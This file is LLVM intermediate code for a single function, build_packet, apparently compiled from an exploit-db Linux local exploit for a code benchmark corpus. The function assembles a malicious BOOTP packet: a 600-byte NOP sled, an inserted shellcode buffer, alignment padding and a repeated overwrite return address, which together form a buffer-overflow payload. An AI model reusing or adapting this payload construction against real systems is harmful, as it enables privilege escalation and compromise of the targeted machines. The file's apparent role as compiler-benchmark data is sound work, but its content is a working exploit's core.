; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19256.c_build_packet.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19256.c_build_packet.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.bootp = type { i32, i32, i8*, %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }

@realpath_adjust = common dso_local global i32 0, align 4
@BOOTREQUEST = common dso_local global i32 0, align 4
@HTYPE_ETHERNET = common dso_local global i32 0, align 4
@client_addr = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [19 x i8] c"Using: client: %s\0A\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"Using: server: %s\0A\00", align 1
@host_addr = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [22 x i8] c"Addr of realpath: %x\0A\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"Added: %d nops\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [30 x i8] c"%d bytes of shellcode added.\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"%d bytes of alignment added.\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"Setting return addr to: %x \0A\00", align 1
@exploit_length = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [19 x i8] c"Exploit length: %d\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @build_packet(%struct.bootp* %0, i32 %1, i8** %2) #0 {
  %4 = alloca %struct.bootp*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i64*, align 8
  %15 = alloca i32, align 4
  store %struct.bootp* %0, %struct.bootp** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8** %2, i8*** %6, align 8
  %16 = load i32, i32* @realpath_adjust, align 4
  %17 = add i32 -1073744252, %16
  %18 = zext i32 %17 to i64
  store i64 %18, i64* %7, align 8
  %19 = load i64, i64* %7, align 8
  %20 = add i64 %19, 8
  %21 = add i64 %20, 1160
  store i64 %21, i64* %8, align 8
  store i64 0, i64* %10, align 8
  store i32 1, i32* %11, align 4
  store i32 600, i32* %12, align 4
  %22 = load i32, i32* @BOOTREQUEST, align 4
  %23 = load %struct.bootp*, %struct.bootp** %4, align 8
  %24 = getelementptr inbounds %struct.bootp, %struct.bootp* %23, i32 0, i32 5
  store i32 %22, i32* %24, align 8
  %25 = load %struct.bootp*, %struct.bootp** %4, align 8
  %26 = getelementptr inbounds %struct.bootp, %struct.bootp* %25, i32 0, i32 0
  store i32 58524, i32* %26, align 8
  %27 = load i32, i32* @HTYPE_ETHERNET, align 4
  %28 = load %struct.bootp*, %struct.bootp** %4, align 8
  %29 = getelementptr inbounds %struct.bootp, %struct.bootp* %28, i32 0, i32 4
  store i32 %27, i32* %29, align 4
  %30 = load %struct.bootp*, %struct.bootp** %4, align 8
  %31 = getelementptr inbounds %struct.bootp, %struct.bootp* %30, i32 0, i32 1
  store i32 6, i32* %31, align 4
  %32 = load i8*, i8** @client_addr, align 8
  %33 = call i32 @inet_addr(i8* %32)
  %34 = load %struct.bootp*, %struct.bootp** %4, align 8
  %35 = getelementptr inbounds %struct.bootp, %struct.bootp* %34, i32 0, i32 3
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 0
  store i32 %33, i32* %36, align 8
  %37 = load i8*, i8** @client_addr, align 8
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0), i8* %37)
  %39 = load i8*, i8** @host_addr, align 8
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %39)
  %41 = load i64, i64* %7, align 8
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i64 %41)
  %43 = load %struct.bootp*, %struct.bootp** %4, align 8
  %44 = getelementptr inbounds %struct.bootp, %struct.bootp* %43, i32 0, i32 2
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  store i32 0, i32* %15, align 4
  br label %46

46:                                               ; preds = %53, %3
  %47 = load i32, i32* %15, align 4
  %48 = load i32, i32* %12, align 4
  %49 = icmp slt i32 %47, %48
  br i1 %49, label %50, label %56

50:                                               ; preds = %46
  %51 = load i8*, i8** %13, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %13, align 8
  store i8 -112, i8* %51, align 1
  br label %53

53:                                               ; preds = %50
  %54 = load i32, i32* %15, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %15, align 4
  br label %46

56:                                               ; preds = %46
  %57 = load i32, i32* %12, align 4
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %57)
  store i32 0, i32* %15, align 4
  br label %59

59:                                               ; preds = %72, %56
  %60 = load i32, i32* %15, align 4
  %61 = load i8*, i8** @shellcode, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %75

64:                                               ; preds = %59
  %65 = load i8*, i8** @shellcode, align 8
  %66 = load i32, i32* %15, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = load i8, i8* %68, align 1
  %70 = load i8*, i8** %13, align 8
  %71 = getelementptr inbounds i8, i8* %70, i32 1
  store i8* %71, i8** %13, align 8
  store i8 %69, i8* %70, align 1
  br label %72

72:                                               ; preds = %64
  %73 = load i32, i32* %15, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %15, align 4
  br label %59

75:                                               ; preds = %59
  %76 = load i8*, i8** @shellcode, align 8
  %77 = call i32 @strlen(i8* %76)
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0), i32 %77)
  %79 = load i8*, i8** %13, align 8
  %80 = load %struct.bootp*, %struct.bootp** %4, align 8
  %81 = getelementptr inbounds %struct.bootp, %struct.bootp* %80, i32 0, i32 2
  %82 = load i8*, i8** %81, align 8
  %83 = ptrtoint i8* %79 to i64
  %84 = ptrtoint i8* %82 to i64
  %85 = sub i64 %83, %84
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = add nsw i64 %85, %87
  %89 = load i64, i64* %7, align 8
  %90 = add i64 %88, %89
  store i64 %90, i64* %9, align 8
  store i32 0, i32* %15, align 4
  br label %91

91:                                               ; preds = %102, %75
  %92 = load i32, i32* %15, align 4
  %93 = sext i32 %92 to i64
  %94 = load i64, i64* %8, align 8
  %95 = load i64, i64* %9, align 8
  %96 = sub i64 %94, %95
  %97 = urem i64 %96, 4
  %98 = icmp ult i64 %93, %97
  br i1 %98, label %99, label %105

99:                                               ; preds = %91
  %100 = load i8*, i8** %13, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %13, align 8
  store i8 97, i8* %100, align 1
  br label %102

102:                                              ; preds = %99
  %103 = load i32, i32* %15, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %15, align 4
  br label %91

105:                                              ; preds = %91
  %106 = load i64, i64* %8, align 8
  %107 = load i64, i64* %9, align 8
  %108 = sub i64 %106, %107
  %109 = urem i64 %108, 4
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0), i64 %109)
  %111 = load i64, i64* %7, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = add i64 %111, %113
  %115 = load i32, i32* %12, align 4
  %116 = sdiv i32 %115, 2
  %117 = sext i32 %116 to i64
  %118 = add i64 %114, %117
  store i64 %118, i64* %10, align 8
  %119 = load i64, i64* %10, align 8
  %120 = and i64 %119, 255
  %121 = icmp ne i64 %120, 0
  br i1 %121, label %125, label %122

122:                                              ; preds = %105
  %123 = load i64, i64* %10, align 8
  %124 = add i64 %123, 1
  store i64 %124, i64* %10, align 8
  br label %125

125:                                              ; preds = %122, %105
  %126 = load i64, i64* %10, align 8
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0), i64 %126)
  %128 = load i8*, i8** %13, align 8
  %129 = bitcast i8* %128 to i64*
  store i64* %129, i64** %14, align 8
  br label %130

130:                                              ; preds = %136, %125
  %131 = load i64, i64* %10, align 8
  %132 = load i64*, i64** %14, align 8
  %133 = getelementptr inbounds i64, i64* %132, i32 1
  store i64* %133, i64** %14, align 8
  store i64 %131, i64* %132, align 8
  %134 = load i64*, i64** %14, align 8
  %135 = bitcast i64* %134 to i8*
  store i8* %135, i8** %13, align 8
  br label %136

136:                                              ; preds = %130
  %137 = load i8*, i8** %13, align 8
  %138 = load %struct.bootp*, %struct.bootp** %4, align 8
  %139 = getelementptr inbounds %struct.bootp, %struct.bootp* %138, i32 0, i32 2
  %140 = load i8*, i8** %139, align 8
  %141 = ptrtoint i8* %137 to i64
  %142 = ptrtoint i8* %140 to i64
  %143 = sub i64 %141, %142
  %144 = load i32, i32* @exploit_length, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp slt i64 %143, %145
  br i1 %146, label %130, label %147

147:                                              ; preds = %136
  %148 = load i8*, i8** %13, align 8
  %149 = getelementptr inbounds i8, i8* %148, i32 1
  store i8* %149, i8** %13, align 8
  store i8 0, i8* %148, align 1
  %150 = load %struct.bootp*, %struct.bootp** %4, align 8
  %151 = getelementptr inbounds %struct.bootp, %struct.bootp* %150, i32 0, i32 2
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @strlen(i8* %152)
  %154 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0), i32 %153)
  ret void
}

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
